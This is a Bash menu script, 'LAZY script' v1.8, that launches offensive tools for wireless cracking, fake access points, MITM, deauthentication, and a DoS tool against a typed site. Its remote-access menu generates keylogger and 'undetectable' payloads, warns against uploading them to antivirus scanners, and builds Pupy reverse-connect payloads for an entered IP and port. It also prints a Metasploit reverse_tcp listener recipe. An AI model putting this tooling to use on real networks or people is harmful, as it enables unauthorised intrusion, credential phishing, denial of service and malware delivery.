#! /bin/bash
VERSION=1.8
#############DEFAULTS###############
#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKT="Press "$YS"any key$CE to"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."
#path for lscript
LPATH="/root/lscript"
KSPATH=""$LPATH"/ks"
if [ ! -d /root/lscript/ks ]
then
	mkdir /root/lscript/ks
fi
####################################
function banner
{
	echo -e ""
	echo -e "$RS         ██╗      █████╗ ███████╗██╗   ██╗$CE v$VERSION"
	echo -e "$RS         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝$CE"
	echo -e "$RS         ██║     ███████║  ███╔╝  ╚████╔╝ $CE   by "$RS"ARIS MELACHROINOS$CE"
	echo -e "$RS         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE"
	echo -e "$RS    The  ███████╗██║  ██║███████╗   ██║  script$CE"
	echo -e "$RS         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
	echo -e ""$YS"if"$CE") Ifconfig"
	echo -e ""$YS" 1"$CE") Enable $WLANN                      "$YS"d1"$CE") Disable $WLANN"
	echo -e ""$YS" 2"$CE") Enable $WLANNM                   "$YS"d2"$CE") Disable $WLANNM"
	echo -e ""$YS" 3"$CE") Change MAC                        "$YS"d3"$CE") Restore original MAC"
	echo -e ""$YS" 4"$CE") Enable 4nonimizer                 "$YS"d4"$CE") Disable 4nonimizer"
	echo -e ""$YS" 5"$CE") Enable anonsurf                   "$YS"d5"$CE") Disable anonsurf"
	echo -e ""$YS" 6"$CE") Status of anonsurf                "$YS"d6"$CE") Restart anonsurf"
	echo -e ""$YS" 7"$CE") View your Public IP"
	echo -e ""$YS" 8"$CE") View your MAC"
	echo -e ""$YS" 9"$CE") TOOLS"
	echo -e ""$YS"10"$CE") Handshake       (WPA-WPA2)        "$YS"start"$CE") 1 2 3"
	echo -e ""$YS"11"$CE") Find WPS pin    (WPA-WPA2)         "$YS"stop"$CE") d1 d2 d3"
	echo -e ""$YS"12"$CE") WEP hacking     (WEP)            "$YS"update"$CE") Check for updates"
	echo -e ""$YS"13"$CE") MITM                             "$YS"errors"$CE") Fix some errors"
	echo -e ""$YS"14"$CE") Metasploit                           "$YS"ks"$CE") Custom shortucts"
	echo -e ""$YS" 0"$CE") EXIT"
	echo "Choose: "
	read -e YORNAA
	clear
}
function interface_selection
{
echo -e "$YS 1$CE) $WLANN"
echo -e "$YS 2$CE) $WLANNM"
echo -e "$YS 3$CE) Eth0"
echo -e ""$YS"00$CE) Main menu"
echo -e "$YS 0$CE) EXIT"
read -e MYINT
if [ "$MYINT" = "2" ]
then
	MYINT="$WLANNM"
elif [ "$MYINT" = "1" ]
then
	MYINT="$WLANN"
elif [ "$MYINT" = "0" ]
then
	clear
	exit
elif [ "$MYINT" = "00" ]
then
	exec bash "$0"
elif [ "$MYINT" = "3" ]
then
	MYINT="eth0"
else
echo -e "Wrong choice..."
sleep 2
clear
echo -e "EXITING"
sleep 1
exec bash "$0"
fi
export MYINT
}
function set_interface_number
{
echo -e "Enter the number of your wireless card(etc type "$YS"0"$CE" if wlan0): " 
read INUMB
echo -e "So your wireless interfaces are wlan$INUMB and wlan"$INUMB"mon?"$YNYES": "
read INTCONFNUMB
if [ "$INTCONFNUMB" = "n" ]
then
	clear
	echo -e "Then why did you type that? lol"
	sleep 3
	exec bash "$0"
else
	echo wlan$INUMB > "$LPATH"/wlan.txt
	echo wlan"$INUMB"mon > "$LPATH"/wlanmon.txt
	echo -e "Done "
	sleep 1
	clear
	echo -e "If you want to change it, type "$YS"interface"$CE" any time"
	sleep 1
	echo -e "$PAKTC"
	read	
fi
}
function checkifalready
{
	GOOD="1"
	num=1
	while [ $num -le 20 ]
	do
		if [ "$CHECKKS" = "$num" ]
		then
			GOOD="0"
			echo -e "This shortcut is already in use by the script."
		fi
		num=$(( num+1 ))
	done
	if [ "$GOOD" = "1" ]
	then
		if [ "$CHECKKS" = "" ] || [ "$CHECKKS" = "if" ] || [ "$CHECKKS" = "ifconfig" ] || [ "$CHECKKS" = "interfaces" ] || [ "$CHECKKS" = "interface" ] || [ "$CHECKKS" = "errors" ] || [ "$CHECKKS" = "00" ] || [ "$CHECKKS" = "exit" ] || [ "$CHECKKS" = "update" ] || [ "$CHECKKS" = "d1" ] || [ "$CHECKKS" = "d2" ] || [ "$CHECKKS" = "d3" ] || [ "$CHECKKS" = "d4" ] || [ "$CHECKKS" = "d5" ] || [ "$CHECKKS" = "d6" ] || [ "$CHECKKS" = "d7" ] || [ "$CHECKKS" = "gg" ] || [ "$CHECKKS" = "ks" ]
		then
			GOOD="0"
			echo -e "This shortcut is already in use by the script."
		fi
	fi
	if [ "$CHECKKS" = "delete" ]
	then
		GOOD="0"
	fi
	if [ "$GOOD" = "1" ]
	then
		BACKUPTITLE="$TITLE"
		BACKUPNN="$nn"
		num=1
		while [ $num -le 20 ]
		do
		nn="$num"
		listshortcuts
		if [ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]
		then
			read KSIFALREADY < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [ "$CHECKKS" == "$KSIFALREADY" ]
			then
				echo -e "Shortcut '"$CHECKKS"' is already in use by "$TITLE""
				GOOD=0
				sleep 3
			fi
		fi
		num=$(( num+1 ))
		done
		nn="$BACKUPNN"
		TITLE="$BACKUPTITLE"
	fi
	clear
}	
function createshortcut
{
if [ ! -d ""$KSPATH"/$TITLE" ]
then
	mkdir "$KSPATH"/"$TITLE"
fi
clear
echo -e "Enter the keyboard shortcut that will open "$TITLE" from lscript's main menu"
echo -e "(etc: "$YS""$TITLE""$CE")"
echo -e "To delete it , type:   "$YS"delete"$CE""
echo -e ""$YS"back"$CE") Go back"
read CHECKKS
if [ "$CHECKKS" == "back" ]
then
	BACKKS=1
else
	BACKKS=0
fi
if [ "$BACKKS" == 0 ]
then
	CHECKKSBACKUP="$CHECKKS"
	NAMECDBACKUP="$NAMECD"
	KSSETBACKUP="$KSSET"
	checkifalready
	CHECKKS="$CHECKKSBACKUP"
	NAMECD="$NAMECDBACKUP"
	KSSET="$KSSETBACKUP"
	if [ "$GOOD" = "1" ]
	then
		echo -e "Shortcut is ok.Setting it up..."
		sleep 1
		echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
		echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
		echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
		echo -e "Done!"
		echo -e "$PAKTGB"
		read
		clear
		break
	else
		clear
		echo -e "Removing shortcut for "$TITLE"..."
		rm -r "$KSPATH"/"$TITLE"
		sleep 1
		echo -e "Done."
		echo -e "$PAKTGB"
		read
		clear
		break
	fi
fi
}
function listshortcuts
{
	if [ "$nn" = "1" ]
	then
		TITLE="Fluxion"
		NAMECD="cd /root/fluxion"
		KSSET="./fluxion"
	elif [ "$nn" = "2" ]
	then
		TITLE="Zirikatu"
		NAMECD="cd /root/zirikatu"
		KSSET="./zirikatu.sh"
	elif [ "$nn" = "3" ]
	then
		TITLE="Wifite"
		NAMECD=""
		KSSET="wifite"
	elif [ "$nn" = "4" ]
	then
		TITLE="Wifiphisher"
		NAMECD=""
		KSSET="wifiphisher"
	elif [ "$nn" = "5" ]
	then
		TITLE="Zatacker"
		NAMECD="cd /root/Zatacker"
		KSSET="./ZT.sh"
	elif [ "$nn" = "6" ]
	then
		TITLE="Morpheus"
		NAMECD="cd /root/morpheus"
		KSSET="./morpheus.sh"
	elif [ "$nn" = "7" ]
	then
		TITLE="Hakku"
		NAMECD="cd /root/hakkuframework"
		KSSET="./hakku"
	elif [ "$nn" = "8" ]
	then
		TITLE="Trity"
		NAMECD=""
		KSSET="trity"
	elif [ "$nn" = "9" ]
	then
		TITLE="Cupp"
		NAMECD="cd /root/cupp"
		KSSET="python cupp.py -i"
	elif [ "$nn" = "10" ]
	then
		TITLE="Dracnmap"
		NAMECD="cd /root/Dracnmap"
		KSSET="./dracnmap-v*.sh"
	elif [ "$nn" = "11" ]
	then
		TITLE="Fern"
		NAMECD=""
		KSSET="fern-wifi-cracker"
	elif [ "$nn" = "12" ]
	then
		TITLE="KickThemOut"
		NAMECD="cd /root/kickthemout"
		KSSET="python kickthemout.py"
	elif [ "$nn" = "13" ]
	then
		TITLE="Ghost-Phisher"
		NAMECD=""
		KSSET="ghost-phisher"
	elif [ "$nn" = "14" ]
	then
		TITLE="Xerxes"
		NAMECD="cd /root/xerxes"
		KSSET="./xerxes"
	elif [ "$nn" = "15" ]
	then
		TITLE="Katana"
		NAMECD=""
		KSSET="ktf.console"
	elif [ "$nn" = "16" ]
	then
		TITLE="Airgeddon"
		NAMECD="cd /root/airgeddon"
		KSSET="./airgeddon.sh"
	elif [ "$nn" = "17" ]
	then
		TITLE="Websploit"
		NAMECD=""
		KSSET="websploit"
	elif [ "$nn" = "18" ]
	then
		TITLE="BeeLogger"
		NAMECD="cd /root/BeeLogger"
		KSSET="python bee.py"
	elif [ "$nn" = "19" ]
	then
		TITLE="Ezsploit"
		NAMECD="cd /root/exsploit"
		KSSET="./ezsploit.sh"
	elif [ "$nn" = "20" ]
	then
		TITLE="Pupy"
		NAMECD="cd /root/pupy/pupy"
		KSSET="./pupysh.py"
	fi
}

####################################
if [ "$ONETIMEPERLAUNCH" != "1" ]
then
	if [ -d ""$KSPATH"/nums" ]
	then
		rm "$KSPATH"/nums/*
	else
		mkdir "$KSPATH"/nums
	fi
	nn=1
	ff=1
	HOWMANY=0
	while [ "$nn" != 21 ]
	do
		listshortcuts
		if [ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]
		then
				echo -e "$TITLE" > "$KSPATH"/nums/"$ff".txt
				ff=$(( ff+1 ))
				HOWMANY=$(( HOWMANY+1 ))		
		fi
		nn=$(( nn+1 ))

	done
	ONETIMEPERLAUNCH="1"
fi
####################################
if [ -f ""$LPATH"/IAGREE.txt" ]
then

	if [ ! -f ""$LPATH"/wlan.txt" ]
	then
		set_interface_number
	fi
clear
WLANNM=$(cat "$LPATH"/wlanmon.txt)
WLANN=$(cat "$LPATH"/wlan.txt)
export WLANNM
export WLANN
banner
####check if it is ks
var1=1
	while [ $var1 -le $HOWMANY ]
	do
	read TITLE < "$KSPATH"/nums/"$var1".txt
	read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
	if [ "$YORNAA" = "$YORNAKS" ]
	then
	read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
	read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
	$COMMAND1
	$COMMAND2
	fi
	var1=$(( var1+1 ))
	done
####
	if [ "$YORNAA" = "0" ]
	then
		exit
	elif [ "$YORNAA" = "ks" ]
	then
		if [ ! -d ""$KSPATH"" ]
		then
			mkdir "$KSPATH"
		fi
		while true
		do
		echo -e "-----------------------"$RS"KEYBOARD SHORTCUTS"$CE"------------------------"
		echo -e ""$YS" 1"$CE") Tools"
		echo -e ""$YS"back"$CE") Go back"
		#~ echo -e ""$YS"00"$CE") Main menu"
		echo -e ""$YS" 0"$CE") EXIT"
		read KS
		clear
		if [ "$KS" = "1" ]
		then
			while true
			do
			echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
			nn=1
			#start sorting out all the available shortcuts
			while [ "$nn" != 21 ]
			do
			listshortcuts
			#adding a space where needed on the output,so it will be sorted correctly
			if [ "$nn" -lt "10" ]
			then
				n=" $nn"
			else
				n="$nn"
			fi
			if [ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]
			then
				echo -e ""$YS""$n""$CE") "$TITLE""
			else
				read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
				if [ "$KSKS" = "" ]
				then
					KSKS="ERROR(fix=recreate the shortcut)"
				else
					read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
					size=${#TITLE}
					calc=$(( 35-size ))
					numcalc=1
					SPACES=""
					while [ $numcalc != $calc ]
					do
						SPACES=""$SPACES"_"
						numcalc=$(( numcalc+1 ))
					done
					#~ read SPACES < "$KSPATH"/spaces.txt
					echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
				fi
			fi
			nn=$(( nn+1 ))
			done
			echo -e ""$YS"back"$CE") Go back"
			echo -e ""$YS" 0"$CE") EXIT"
			nn=""
			read nn
			clear
			listshortcuts
			if [ "$nn" = "back" ]
			then
				break
			elif [ "$nn" = "0" ]
			then
				clear
				exit
			elif [ "$nn" = "00" ]
			then
				exec bash "$0"
			elif [ "$nn" = "reset" ]
			then
				rm -r "$KSPATH"/*
			elif [ "$nn" -le 20 ] 
			then
				createshortcut
			fi
			done
		elif [ "$KS" = "back" ]
		then
			break
		elif [ "$KS" = "0" ]
		then
			clear
			exit
		elif [ "$KS" = "00" ]
		then
			exec bash "$0"
		fi
		done
	elif [ "$YORNAA" = "interface" ]
	then
		WLANN=$(cat "$LPATH"/wlan.txt)
		WLANNM=$(cat "$LPATH"/wlanmon.txt)
		echo -e "Your current wireless interface names are $WLANN and $WLANNM"
		sleep 2
		echo -e "Do you want to change you interface number?"$YNYES": "
		read INAG
		if [ "$INAG" = "n" ]
		then
			clear
			echo -e "Then why did you come here? lol"
			sleep 2
			exec bash "$0"
		else
			clear
			rm "$LPATH"/wlan.txt
			rm "$LPATH"/wlanmon.txt
			set_interface_number
		fi
	elif [ "$YORNAA" = "9" ]
	then
		while true
		do
		echo -e "------------------------------"$RS"TOOLS"$CE"------------------------------"
		echo -e ""$YS" 1"$CE") Wifi tools"
		echo -e ""$YS" 2"$CE") Remote access"
		echo -e ""$YS"back"$CE") Go back"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e ""$YS" 0"$CE") EXIT"
		echo "Choose: "
		read -e CATEG
		clear
			if [ "$CATEG" = "1" ]
			then
				while true
				do
				clear
				echo -e "---------------------------"$RS"WIFI TOOLS"$CE"----------------------------"
				echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
				echo -e ""$YS" 2"$CE") Wifite             Multitool"
				echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
				echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
				echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
				echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
				echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
				echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
				echo -e ""$YS" 9"$CE") Cupp               Make specific worldlists"
				echo -e ""$YS"10"$CE") Dracnmap           Many scan options"
				echo -e ""$YS"11"$CE") Fern               Wifi cracker GUI"
				echo -e ""$YS"12"$CE") Netdiscover        IPs and MACs on your net"
				echo -e ""$YS"13"$CE") KickThemOut        Kick clients out of your network"
				echo -e ""$YS"14"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
				echo -e ""$YS"15"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
				echo -e ""$YS"16"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
				#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
				echo -e ""$YS"17"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
				echo -e ""$YS"18"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
				echo -e ""$YS"19"$CE") Katana Framework   Many penetration testing features"
				echo -e ""$YS"20"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
				echo -e ""$YS"21"$CE") Websploit          Wireless attack-multitool"
				echo -e ""$YS"back"$CE") Go back"
				echo -e ""$YS"00"$CE") Main menu"
				echo -e ""$YS" 0"$CE") EXIT"
				echo -e "Choose: "
				read -e APPP
				clear
				if [ "$APPP" = "1" ]
				then
					cd /root/fluxion
					./fluxion
					cd
				elif [ "$APPP" = "2" ]
				then
					wifite
				elif [ "$APPP" = "3" ]
				then
					echo -e "Do you have 1 or 2 wireless interfaces?: "
					read ONEORTWO
					if [ "$ONEORTWO" = "1" ]
					then
						clear
						echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
						sleep 1
						echo -e ""
						echo -e "$PAKTC"
						read
						clear
						wifiphisher -nJ
					else
						clear
						wifiphisher
					fi
				elif [ "$APPP" = "d3" ]
				then
					echo -e "Enter the name of the access point you want to create: "
					read -e ESSIDAP
					wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login
				elif [ "$APPP" = "4" ]
				then
					if [ -d "/root/Zatacker" ]
					then	
						cd /root/Zatacker
						./ZT.sh
						cd
					else
						echo -e "You have to install it manually since its not on github.Sorry."
						sleep 4
						exec bash "$0"
					fi
				elif [ "$APPP" = "5" ]
				then
					cd /root/morpheus
					./morpheus.sh
					cd
				elif [ "$APPP" = "7" ] 
				then
					echo -e "type: 'show modules' to start"
					sleep 2
					clear
					cd /root/hakkuframework
					./hakku
					cd
				elif [ "$APPP" = "8" ]
				then
					echo -e "type: 'help' to start"
					sleep 2
					clear
					trity			
				elif [ "$APPP" = "9" ]
				then
					cd /root/cupp
					python cupp.py -i
					cd			
				elif [ "$APPP" = "10" ]
				then
					cd /root/Dracnmap/
					./dracnmap-v*.sh	
					cd		
				elif [ "$APPP" = "11" ]
				then
					cd /root/Fern-Wifi-Cracker
					python execute.py
					cd
				elif [ "$APPP" = "12" ]
				then
					netdiscover
				elif [ "$APPP" = "13" ]
				then
					cd /root/kickthemout
					python kickthemout.py
					cd
				elif [ "$APPP" = "14" ]
				then
					cd /root/ghost-phisher/Ghost-Phisher
					python ghost.py
					cd
				elif [ "$APPP" = "15" ]
				then
					cd /root/The-Eye
					./TheEye
					cd
				elif [ "$APPP" = "16" ]
				then
					echo -e "Do you own the site you want to DoS?"$YNONLY""
					read DOSTERM
					if [ "$DOSTERM" = "y" ]
					then

						clear
						echo -e "Enter your site(etc iownthissite.com): "
						echo -e "(without www)"
						read -e SITEDOS
						clear
						echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
						sleep 4
						xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
						clear	
						cd /root/xerxes
						SITEDOSX=www.$SITEDOS
						echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
						read
						./xerxes $SITEDOSX 80
					else
						clear
						echo -e "Then never try this."
						sleep 3
						exec bash "$0"
					fi
				elif [ "$APPP" = "17" ]
				then
					echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
					echo -e "Press "$YS"any key"$CE" to start scanning."
					read
					airodump-ng $WLANNM
					echo -e "Enter your target's BSSID: "
					read -e MDBSSID
					echo -e "Enter your target's channel: "
					read -e MDCHANN
					echo -e "Enter frames per second(etc 50): "
					read -e FPS
					clear
					xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'		
				elif [ "$APPP" = "18" ]
				then	
					echo -e "Press "$YS"any key"$CE" to start scanning with wash."
					read
					gnome-terminal -e 'wash -i $WLANNM'
					echo -e "Enter your target's BSSID: "
					read -e MDBSSID
					echo -e "Enter your target's ESSID: "
					read -e MDESSID
					#~ echo -e "Enter your target's channel: "
					#~ read -e MDCHANN
					echo -e "Enter frames per second(etc 50): "
					read -e FPS
					clear
					xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
				elif [ "$APPP" = "19" ]
				then
					ktf.console
				elif [ "$APPP" = "20" ]
				then
					cd /root/airgeddon
					./airgeddon.sh
					cd
				elif [ "$APPP" = "21" ]
				then
					websploit
				elif [ "$APPP" = "6" ]
				then
					while true
					do
					clear
					echo -e ""$YS" 1"$CE") usufy"
					echo -e ""$YS" 2"$CE") mailfy"
					echo -e ""$YS" 3"$CE") searchfy"
					echo -e ""$YS" 4"$CE") domainfy"
					echo -e ""$YS" 5"$CE") phonefy"
					echo -e ""$YS" 6"$CE") entify"
					echo -e ""$YS"back"$CE") Go back"
					echo -e ""$YS"00"$CE") Main menu"
					echo -e ""$YS" 0"$CE") EXIT"
					echo -e "Choose: "
					read -e OSFR
					clear
						if [ "$OSFR" = "1" ]
						then
							echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
							usufy.py
							exit
						elif [ "$OSFR" = "2" ]
						then
							echo -e "Use: mailfy.py -n name1"
							mailfy.py
							exit
						elif [ "$OSFR" = "3" ]
						then
							searchfy.py
							exit
						elif [ "$OSFR" = "4" ]
						then
							domainfy.py
							exit
						elif [ "$OSFR" = "5" ]
						then
							phonefy.py
							exit
						elif [ "$OSFR" = "6" ]
						then
					 	entify.py
							exit
						elif [ "$OSFR" = "0" ]
						then
							exit
						elif [ "$OSFR" = "00" ]
						then
							exec bash "$0"
						elif [ "$OSFR" = "back" ]
						then
							break
						else 
							echo -e "Wrong choice"
							sleep 0.3
							clear
							exec bash "$0"
						fi
					done
				elif [ "$APPP" = "0" ]
				then
					clear
					exit
				elif [ "$APPP" = "00" ]
				then
					clear
					exec bash "$0"
				elif [ "$APPP" = "back" ]
				then
					break
				fi
				done
			elif [ "$CATEG" = "2" ]
			then
				while true 
				do
				clear
				echo -e "-------------------------"$RS"Remote access"$CE"---------------------------"
				echo -e ""$YS" 1"$CE") BeeLogger	Generate keylogger"
				echo -e ""$YS" 2"$CE") Ezsploit	Generate payloads for many platforms,listeners etc..."
				echo -e ""$YS" 3"$CE") Pupy      	Generate payloads for many platforms,listeners etc..."
				echo -e ""$YS" 4"$CE") Zirikatu		Generate undetectable payloads"
				echo -e ""$YS"back"$CE") Go back"
				echo -e ""$YS"00"$CE") Main menu"
				echo -e ""$YS" 0"$CE") EXIT"
				echo -e "Choose: "
				read -e KEYLOG
				clear
				if [ "$KEYLOG" = "1" ]
				then
					cd /root/BeeLogger
					python bee.py
					cd
				elif [ "$KEYLOG" = "2" ]
				then
					clear
					cd /root/ezsploit/
					./ezsploit.sh
					cd
					echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
					echo -e "Open a new terminal and type:"
					echo -e "msfconsole"
					echo -e "use exploit/multi/handler"
					echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. ETC FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
					echo -e "set lhost <YOUR IP HERE>"
					echo -e "set lport 4444"
					echo -e "exploit"
					echo -e "Press "$YS"any key"$CE" to leave..."
					read
					exec bash "$0"
				elif [ "$KEYLOG" = "3" ]
				then
					while true
					do
					clear
					echo -e ""$YS" 1"$CE") Generate a payload"
					echo -e ""$YS" 2"$CE") Start listener"
					echo -e ""$YS"back"$CE") Go back"
					echo -e ""$YS"00"$CE") Main menu"
					echo -e ""$YS" 0"$CE") EXIT"
					read -e PUPY
					if [ "$PUPY" = "1" ]
					then
						clear
						echo -e "Choose the target OS:"
						echo -e ""$YS" 1"$CE") Windows"
						echo -e ""$YS" 2"$CE") Linux"
						echo -e ""$YS" 3"$CE") Android"
						echo -e "Choose: "
						read -e TAROS
						if [ "$TAROS" = "1" ]
						then
							TAROS="windows"
						elif [ "$TAROS" = "2" ]
						then
							TAROS="linux"
						elif [ "$TAROS" = "3" ]
						then
							TAROS="android"
						else
							echo -e "Wrong choice.Returning to main manu..."
							sleep 2
							exec bash "$0"
						fi
						clear
						echo -e "Enter your ip: "
						read -e PUPYIP
						clear
						echo -e "Enter your port(etc: 443): "
						read -e PUPYPORT
						clear
						echo -e "Enter the full output path(etc: /root/Desktop/payload1.exe)"
						read -e PUPYPATH
						cd /root/pupy/pupy
						./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
					elif [ "$PUPY" = "2" ]
					then
						cd /root/pupy/pupy
						./pupysh.py
					elif [ "$PUPY" = "00" ]
					then
						exec bash "$0"
					elif [ "$PUPY" = "back" ]
					then
						break
					elif [ "$PUPY" = "0" ]
					then
						exit
					fi
					done
				elif [ "$KEYLOG" = "4" ]
				then
					clear
					echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
					sleep 3
					echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
					read MUSTBEYES
					if [ "$MUSTBEYES" = "YES" ] 
					then 
						clear
						cd /root/zirikatu
						./zirikatu.sh
					fi
				elif [ "$KEYLOG" = "00" ]
				then
					clear
					exec bash "$0"
				elif [ "$KEYLOG" = "0" ]
				then
					clear
					exit
				elif [ "$KEYLOG" = "back" ]
				then
					break
				fi
				done
			elif [ "$CATEG" = "0" ]
			then
				clear
				exit
			elif [ "$CATEG" = "back" ]
			then
				break
			elif [ "$CATEG" = "00" ]
			then
				clear
				exec bash "$0"
			fi
	done
	elif [ "$YORNAA" = "l" ]
	then
		clear 
		exec bash "$0"
	elif [ "$YORNAA" = "clear" ]
	then
		echo -e "Ok.I can clear for you..."
		sleep 1
		clear
		exec bash "$0"
	elif [ "$YORNAA" = "gg" ]
	then
		geany /bin/lscript/l
	elif [ "$YORNAA" = "1" ]
	then
		echo -e "Enabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		(ifconfig $WLANN up &>/dev/null && echo -e "Done" ) || echo -e "Error. I can't find your wireless adapter"
	elif [ "$YORNAA" = "d1" ]
	then
		echo -e "Disabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		(ifconfig $WLANN down &>/dev/null && echo -e "Done" ) || echo -e "Error. I can't find your wireless adapter."
	elif [ "$YORNAA" = "2" ]
	then
		echo -e "Enabling $WLANNM..."
		echo -e "Killing services..."
		airmon-ng check kill
		echo -e "Done."
		echo -e "Starting monitor mode..."
		(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
	elif [ "$YORNAA" = "d2" ]
	then
		echo -e "Disabling $WLANNM..."
		echo -e "Stopping monitor mode..."
		(airmon-ng stop $WLANNM &>/dev/null && echo -e "Done" ) || echo -e "Error stoping monitor mode."
		echo -e "ok..."
		echo -e "Starting network-manager service..."
		service network-manager start
		echo -e "ok..."
		echo -e "$WLANN is probably up.Bring it down?"$YNNO": "
		read -e YORN
		if [ "$YORN" = "y" ] 
		then
			#rfkill unblock wifi
			#rfkill unblock all
			ifconfig $WLANN down
			echo -e "$WLANN is now down."
		fi
	elif [ "$YORNAA" = "3" ]
	then
		interface_selection
		clear
		echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
		read -e RORS
		clear
		if [ "$RORS" != "s" ]
		then
			echo -e "Changing mac address of $MYINT to a random one..."
			ifconfig $MYINT down
			macchanger -r $MYINT
			ifconfig $MYINT up
			echo -e "Done."
		else
			echo -e "Enter the MAC you want:"
			read -e SMAC
			echo -e "Changing mac address of $MYINT to $SMAC..."
			ifconfig $MYINT down
			macchanger -m $SMAC $MYINT
			ifconfig $MYINT up
			echo -e "Done."
		fi
	elif [ "$YORNAA" = "d3" ]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to the original one..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [ "$YORNAA" = "4" ]
	then
		echo -e "Enabling 4nonimizer..."
		4nonimizer start
		echo -e "Done."
	elif [ "$YORNAA" = "d4" ]
	then
		echo -e "Disabling 4nonimizer..."
		4nonimizer stop
		echo -e "Done."
	elif [ "$YORNAA" = "5" ]
	then
		echo -e "Enabling anonsurf..."
		anonsurf start
		echo -e "Done."
	elif [ "$YORNAA" = "d5" ]
	then
		echo -e "Disabling anonsurf..."
		anonsurf stop
		echo -e "Done."
	elif [ "$YORNAA" = "6" ]
	then
		echo -e "Status of anonsurf..."
		anonsurf status
		echo -e "Done."
	elif [ "$YORNAA" = "d6" ]
	then
		echo -e "Restarting anonsurf..."
		anonsurf change
		echo -e "Done."
	elif [ "$YORNAA" = "r6" ]
	then
		echo -e "Restarting anonsurf..."
		anonym8 change
		echo -e "Done."
	elif [ "$YORNAA" = "7" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			PUBLICIP=$(curl -s ipinfo.io/ip)
			echo "Your public IP is: "$PUBLICIP""
			#~ curl ipinfo.io/ip
			#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
		else
			echo -e "When monitor mode is enabled, you don't have internet access."
			echo -e "Select 'd2' to disable monitor mode"
			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "8" ]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [ "$YORNAA" = "10" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo -e "Monitor mode is not enabled."
			echo -e "Select 'start' or '2' to enable it"
			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		else
			echo -e "Moving into new terminal..."
			sleep 1
			FJC=0
			export FJC
			gnome-terminal --geometry 87x35+9999+0 -e lh1
			sleep 1
			exec bash "$0"
			#~ gnome-terminal --geometry 80x25+0+0 -e l
		fi
	elif [ "$YORNAA" = "11" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo -e "Monitor mode is not enabled."
			echo -e "Select 'start' or '2' to enable it"
